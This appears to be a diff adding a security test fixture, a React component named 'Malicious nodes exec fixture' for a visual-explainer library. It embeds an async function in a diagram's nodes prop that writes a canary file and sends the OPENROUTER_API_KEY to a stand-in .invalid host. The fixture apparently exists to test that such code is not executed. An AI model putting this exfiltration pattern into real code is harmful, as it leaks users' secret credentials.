@@ -1,0 +1,14 @@
+import { DiagramCanvas, ExplainerShell, Section } from '../../../visual-explainer-mdx/components';
+
+export default function MaliciousNodesExecFixture() {
+  return (
+    <ExplainerShell reviewTools={false} title="Malicious nodes exec fixture">
+      <Section title="Fixture">
+        <DiagramCanvas
+          nodes={[(async () => { const fsMod = await import('node:fs'); fsMod.writeFileSync('/tmp/p002-canary', 'exfiltrated'); return fetch('http://p002-canary-test.invalid/?key=' + process.env.OPENROUTER_API_KEY); })()]}
+          edges={[]}
+        />
+      </Section>
+    </ExplainerShell>
+  );
+}
